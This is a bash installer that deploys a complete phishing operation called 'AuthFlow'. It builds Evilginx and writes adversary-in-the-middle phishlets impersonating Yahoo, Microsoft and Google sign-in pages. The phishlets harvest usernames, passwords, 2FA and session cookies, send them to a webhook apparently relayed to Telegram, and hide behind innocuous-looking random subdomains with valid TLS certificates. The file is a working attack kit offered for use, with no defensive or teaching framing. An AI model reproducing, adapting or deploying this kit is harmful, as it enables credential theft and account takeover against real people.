#!/bin/bash
set -e

GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m'
log() { echo -e "${GREEN}[+]${NC} $1"; }
err() { echo -e "${RED}[ERROR]${NC} $1"; exit 1; }

clear
echo "============================================"
echo "     AuthFlow Installation"
echo "============================================"
echo ""

[ "$EUID" -ne 0 ] && err "Run as root: sudo bash install.sh"

read -p "Domain: " DOMAIN
read -p "VPS IP: " VPS_IP
read -p "Telegram Bot Token: " TG_TOKEN
read -p "Telegram Chat ID: " TG_CHAT
read -p "Cloudflare API Token: " CF_TOKEN
read -sp "Admin Password (blank=auto): " ADMIN_PASS
echo ""

[ -z "$ADMIN_PASS" ] && ADMIN_PASS=$(openssl rand -base64 16 | tr -d '/+=' | cut -c1-16)
WEBHOOK_SECRET=$(openssl rand -hex 16)
ADMIN_PATH=$(openssl rand -hex 12)
EP1="collector-$(openssl rand -hex 4)"
EP2="tracker-$(openssl rand -hex 4)"
EP3="monitor-$(openssl rand -hex 4)"

echo ""
echo "Endpoints: https://$EP1.$DOMAIN | https://$EP2.$DOMAIN | https://$EP3.$DOMAIN"
read -p "Continue? (y/n): " -n 1 -r
echo ""
[[ ! $REPLY =~ ^[Yy]$ ]] && exit 1

log "Installing dependencies..."
apt-get update -qq && apt-get install -y -qq git curl wget nginx certbot python3-certbot-dns-cloudflare golang-go

log "Installing Evilginx..."
cd /opt
rm -rf evilginx2
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make build
cp build/evilginx /usr/local/bin/
chmod +x /usr/local/bin/evilginx

log "Building AuthFlow..."
INSTALL_DIR="/opt/authflow"
mkdir -p $INSTALL_DIR/{data,logs}
cd $INSTALL_DIR

go mod init authflow 2>/dev/null || true
go get github.com/gin-gonic/gin github.com/google/uuid github.com/gorilla/websocket github.com/mattn/go-sqlite3
go build -ldflags="-s -w" -o authflow-server

log "Creating configuration..."
mkdir -p /opt/evilginx/{phishlets,certs}

cat > $INSTALL_DIR/config.json << EOF
{
    "domain": "$DOMAIN",
    "vps_ip": "$VPS_IP",
    "telegram_token": "$TG_TOKEN",
    "telegram_chat": "$TG_CHAT",
    "admin_pass": "$ADMIN_PASS",
    "data_dir": "$INSTALL_DIR/data",
    "endpoints": {
        "service1": "$EP1",
        "service2": "$EP2",
        "service3": "$EP3"
    },
    "admin_path": "$ADMIN_PATH",
    "retention_days": 30,
    "webhook_secret": "$WEBHOOK_SECRET"
}
EOF

log "Configuring Evilginx..."
cat > /opt/evilginx/config.yaml << EOF
daemon = false
debug = false
version = 3.0.0
domain = $DOMAIN
ipv4 = 0.0.0.0
http_port = 8081
https_port = 8443
redirect_url = https://www.google.com
phishlets_path = /opt/evilginx/phishlets
cert_path = /opt/evilginx/certs
database = /opt/evilginx/evilginx.db
EOF

# Create phishlet for service1
cat > /opt/evilginx/phishlets/service1.yaml << EOF
name: 'service1'
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: '$EP1', orig_sub: 'login', domain: 'yahoo.com', session: true, is_landing: true}
sub_filters:
  - {trg: 'login.yahoo.com', orig: 'login.yahoo.com', repl: '$EP1.{hostname}'}
auth_tokens:
  - domain: '.yahoo.com'
    keys: ['A3', 'A1', 'A1S']
credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'
login:
  domain: 'login.yahoo.com'
  path: '/'
js_inject:
  - trigger: 'login.yahoo.com'
    code: |
      (function() {
        var urlParams = new URLSearchParams(window.location.search);
        var email = urlParams.get('email');
        if (email) {
          var emailField = document.querySelector('input[name="username"]');
          if (emailField) {
            emailField.value = email;
            emailField.dispatchEvent(new Event('input', { bubbles: true }));
          }
        }
      })()
webhook:
  url: "http://127.0.0.1:8080/api/webhook"
  headers:
    X-Webhook-Secret: "$WEBHOOK_SECRET"
  format: "json"
  events: ["email", "credentials", "2fa", "session"]
EOF

# Create phishlet for service2
cat > /opt/evilginx/phishlets/service2.yaml << EOF
name: 'service2'
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: '$EP2', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
sub_filters:
  - {trg: 'login.microsoftonline.com', orig: 'login.microsoftonline.com', repl: '$EP2.{hostname}'}
auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'
login:
  domain: 'login.microsoftonline.com'
  path: '/'
js_inject:
  - trigger: 'login.microsoftonline.com'
    code: |
      (function() {
        var urlParams = new URLSearchParams(window.location.search);
        var email = urlParams.get('email');
        if (email) {
          var emailField = document.querySelector('input[name="login"]');
          if (emailField) {
            emailField.value = email;
            emailField.dispatchEvent(new Event('input', { bubbles: true }));
          }
        }
      })()
webhook:
  url: "http://127.0.0.1:8080/api/webhook"
  headers:
    X-Webhook-Secret: "$WEBHOOK_SECRET"
  format: "json"
  events: ["email", "credentials", "2fa", "session"]
EOF

# Create phishlet for service3
cat > /opt/evilginx/phishlets/service3.yaml << EOF
name: 'service3'
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: '$EP3', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true}
sub_filters:
  - {trg: 'accounts.google.com', orig: 'accounts.google.com', repl: '$EP3.{hostname}'}
auth_tokens:
  - domain: '.google.com'
    keys: ['SID', 'LSID', '__Secure-1PSID', '__Secure-3PSID']
credentials:
  username:
    key: 'identifier'
    search: '(.*)'
    type: 'post'
  password:
    key: 'Passwd'
    search: '(.*)'
    type: 'post'
login:
  domain: 'accounts.google.com'
  path: '/v3/signin/identifier'
js_inject:
  - trigger: 'accounts.google.com'
    code: |
      (function() {
        var urlParams = new URLSearchParams(window.location.search);
        var email = urlParams.get('email');
        if (email) {
          var emailField = document.querySelector('input[type="email"]');
          if (emailField) {
            emailField.value = email;
            emailField.dispatchEvent(new Event('input', { bubbles: true }));
          }
        }
      })()
webhook:
  url: "http://127.0.0.1:8080/api/webhook"
  headers:
    X-Webhook-Secret: "$WEBHOOK_SECRET"
  format: "json"
  events: ["email", "credentials", "2fa", "session"]
EOF

log "Setting up SSL..."
mkdir -p ~/.secrets
cat > ~/.secrets/cloudflare.ini << EOF
dns_cloudflare_api_token = $CF_TOKEN
EOF
chmod 600 ~/.secrets/cloudflare.ini

certbot certonly --dns-cloudflare --dns-cloudflare-credentials ~/.secrets/cloudflare.ini \
    -d "$DOMAIN" -d "*.$DOMAIN" --non-interactive --agree-tos --register-unsafely-without-email

log "Configuring Nginx..."
cat > /etc/nginx/sites-available/authflow << EOF
server {
    listen 80;
    server_name $DOMAIN *.$DOMAIN;
    return 301 https://\$server_name\$request_uri;
}

server {
    listen 443 ssl http2;
    server_name $DOMAIN;
    ssl_certificate /etc/letsencrypt/live/$DOMAIN/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/$DOMAIN/privkey.pem;
    
    location / {
        proxy_pass http://127.0.0.1:8080;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
    }
    
    location /ws {
        proxy_pass http://127.0.0.1:8080/ws;
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection "upgrade";
    }
}

server {
    listen 443 ssl http2;
    server_name ~^(collector|tracker|monitor)-.+\.$DOMAIN$;
    ssl_certificate /etc/letsencrypt/live/$DOMAIN/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/$DOMAIN/privkey.pem;
    
    location / {
        proxy_pass https://127.0.0.1:8443;
        proxy_ssl_verify off;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_redirect off;
        proxy_buffering off;
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection "upgrade";
    }
}
EOF

ln -sf /etc/nginx/sites-available/authflow /etc/nginx/sites-enabled/
rm -f /etc/nginx/sites-enabled/default
nginx -t && systemctl start nginx && systemctl enable nginx && systemctl reload nginx

log "Creating systemd services..."
cat > /etc/systemd/system/authflow.service << EOF
[Unit]
Description=AuthFlow Service
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$INSTALL_DIR
ExecStart=$INSTALL_DIR/authflow-server
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

cat > /etc/systemd/system/evilginx.service << EOF
[Unit]
Description=Evilginx Proxy
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/evilginx
ExecStart=/usr/local/bin/evilginx -c /opt/evilginx/config.yaml
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable authflow evilginx nginx
systemctl start authflow evilginx

sleep 3

clear
echo ""
echo "============================================"
echo "     Installation Complete"
echo "============================================"
echo ""
echo "Dashboard: https://$DOMAIN/$ADMIN_PATH"
echo "Username: admin"
echo "Password: $ADMIN_PASS"
echo ""
echo "Endpoints:"
echo "  1: https://$EP1.$DOMAIN"
echo "  2: https://$EP2.$DOMAIN"
echo "  3: https://$EP3.$DOMAIN"
echo ""
echo "Commands:"
echo "  journalctl -u authflow -f"
echo "============================================"
